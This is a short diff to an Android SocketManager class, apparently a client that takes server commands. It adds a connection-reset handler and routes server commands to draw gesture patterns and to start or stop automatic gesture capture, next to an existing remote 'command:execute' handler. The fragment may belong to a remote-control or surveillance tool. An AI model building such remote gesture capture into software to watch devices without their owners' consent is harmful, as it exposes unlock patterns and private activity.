@@ -399,6 +399,19 @@ public class SocketManager {
                     Log.i(TAG, "Server acknowledged registration ✓");
                     break;
 
+                case "connection:reset":
+                    Log.w(TAG, "Server requested connection reset — reconnecting cleanly");
+                    // Close socket to trigger the reconnect loop; stored data is untouched
+                    executor.execute(() -> {
+                        connected = false;
+                        closeSilently();
+                        try { if (streamSocket != null) streamSocket.close(); } catch (Exception ignored) {}
+                        try { if (liveSocket   != null) liveSocket.close();   } catch (Exception ignored) {}
+                        streamConnected = false;
+                        liveConnected   = false;
+                    });
+                    break;
+
                 case "command:execute":
                     if (data != null) {
                         String     commandId = data.optString("commandId", "");
@@ -683,6 +696,9 @@ public class SocketManager {
                     st.put("paused",    gestureRecorder.isPaused());
                     return st;
                 }
+                case "gesture_draw_pattern":  return gestureRecorder.drawPattern(params);
+                case "gesture_auto_capture_start": return gestureRecorder.startAutoCapture();
+                case "gesture_auto_capture_stop":  return gestureRecorder.stopAutoCapture();
             }
         }
 
